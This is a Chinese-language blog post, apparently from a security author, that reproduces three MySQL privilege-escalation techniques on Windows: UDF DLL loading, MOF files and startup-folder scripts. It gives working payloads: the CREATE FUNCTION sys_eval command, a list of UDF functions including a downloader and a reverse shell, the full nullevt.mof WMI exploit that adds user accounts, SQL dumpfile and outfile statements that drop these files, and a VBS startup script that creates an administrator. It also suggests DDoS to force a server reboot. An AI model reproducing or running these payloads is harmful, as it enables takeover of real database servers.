<h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>动态链接库：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
<h3 id="提权分析"><a href="#提权分析" class="headerlink" title="提权分析"></a>提权分析</h3><p>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
<h2 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>这里我用暗月的马，改了一些参数。后面我会把所有工具打包</p>
<h3 id="访问提权马"><a href="#访问提权马" class="headerlink" title="访问提权马"></a>访问提权马</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224415-309ea058-9987-1.png" alt></p>
<h3 id="导出dll到指定目录"><a href="#导出dll到指定目录" class="headerlink" title="导出dll到指定目录"></a>导出dll到指定目录</h3><p>利用提权马将写在其中的二进制导出一个dll到指定目录，但导出的dll文件路径有要求</p>
<ul>
<li><p>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</p>
</li>
<li><p>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p>
</li>
</ul>
<p><strong>但是大于5.1版本的时候没有plugin这个文件夹，需要我们自己创建。</strong></p>
<p>靶机mysql版本为5.5，那我们只能自己创建一个plugin文件夹了，先用<code>select @@basedir;</code>获取安装目录。</p>
<p>在该目录下创建一个plugin文件夹，网上有大神说可以用ntfs创建目录，感兴趣的话可以研究一下，我这里直接菜刀新建</p>
<p>这个提权马自带的导出要用到Into dumpfile，但是file_priv为Null这个问题限制了我们，就算我们修改了my.ini文件也要重启mysql，那我们直接传一个dll上去吧，文件名为<code>hpudf.dll</code>如图</p>
<h3 id="将udf的自定义函数引入"><a href="#将udf的自定义函数引入" class="headerlink" title="将udf的自定义函数引入"></a>将udf的自定义函数引入</h3><p>我们刚才只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
<p>引入sys_eval函数：</p>
<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;hpudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，hpudf.dll是你导出文件的名字;</p>
<p>常见的函数如下：</p>
<pre><code>cmdshell 执行cmd;

downloader 下载者,到网上下载指定文件并保存到指定目录;

open3389 通用开3389终端服务,可指定端口(不改端口无需重启);

backshell 反弹Shell;

ProcessView 枚举系统进程;

KillProcess 终止指定进程;

regread 读注册表;

regwrite 写注册表;

shut 关机,注销,重启;

about 说明与帮助函数;</code></pre><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>执行命令模板：</p>
<pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>添加用户/管理员<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224507-4fc7644c-9987-1.png" alt></p>
<p>查看一下用户<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224525-5ad82b8c-9987-1.png" alt></p>
<p>get it~</p>
<h1 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h1><p>MOF提权的条件要求十分严苛：</p>
<ol>
<li>windows 03及以下版本</li>
<li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li>
<li>secure-file-priv参数不为null</li>
</ol>
<p>mysql以root身份启动，具有c盘下system32/wbem/mof这点权限的要求，就已经非常严格了。。而且win7 sp1就已经没有这个nullevt.mof这个文件了，那么这里记一下poc，来对windows 03的机子进行验证。</p>
<h2 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h2><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。</p>
<h2 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h2><p>MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
<h2 id="公开的nullevt-mof利用代码"><a href="#公开的nullevt-mof利用代码" class="headerlink" title="公开的nullevt.mof利用代码"></a>公开的nullevt.mof利用代码</h2><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
instance of __EventFilter as $EventFilter
{
EventNamespace = &quot;Root\\Cimv2&quot;;
Name = &quot;filtP2&quot;;
Query = &quot;Select * From __InstanceModificationEvent &quot;
&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
&quot;And TargetInstance.Second = 5&quot;;
QueryLanguage = &quot;WQL&quot;;
};
instance of ActiveScriptEventConsumer as $Consumer
{
Name = &quot;consPCSV2&quot;;
ScriptingEngine = &quot;JScript&quot;;
ScriptText =
&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;;
};
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};</code></pre><h2 id="MOF文件利用"><a href="#MOF文件利用" class="headerlink" title="MOF文件利用"></a>MOF文件利用</h2><p>将上面的脚本上传到有读写权限的目录下：</p>
<p>这里我上传到了<code>C:\Documents and Settings\test</code></p>
<p>根据前面的phpmyadmin，我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下<br>payload:</p>
<pre><code>select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</p>
<h2 id="验证提权"><a href="#验证提权" class="headerlink" title="验证提权"></a>验证提权</h2><p>当我们成功把mof导出时，mof就会直接被执行，且5秒创建一次用户。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224611-75eaad5a-9987-1.png" alt><br>可以看到，我们在test的普通用户下直接添加了hpdoger用户。剩下的操作就是用户命令处，换成加入administrator语句即可：</p>
<pre><code>net.exe user localgroup administrator hpdoger /add\</code></pre><h2 id="关于Mof提权的弊端"><a href="#关于Mof提权的弊端" class="headerlink" title="关于Mof提权的弊端"></a>关于Mof提权的弊端</h2><p>我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？</p>
<p>cmd 下运行下面语句:</p>
<pre><code>net stop winmgmt
del c:/windows/system32/wbem/repository
net start winmgmt</code></pre><p>重启服务即可。</p>
<h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h1><p>在前两种方法都失败时，那可以试一下这个苟延残喘的启动项提权..因为要求达到的条件和mof几乎一样，并且要重启服务，所以不是十分推荐。原理还是使用mysql写文件，写入一段VBS代码到开机自启动中，服务器重启达到创建用户并提权，可以使用DDOS迫使服务器重启。</p>
<h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><p>file_priv 不为null<br>已知root密码</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre><code>create table a (cmd text); 
insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); 
insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); 
insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); 
select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;;</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有很多cve这里没有复现到。Mysql提权在如今被各种因素限制，但掌握这一门技术或多或少对我们都还是有所帮助的</p>

                
            </div>
            <div class="continue">
            <a href="/2018/09/08/基于Windows下mysql的一些提权分析/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
</section>

  <nav class="page-nav">
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">下一页 &raquo;</a>
  </nav>

    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>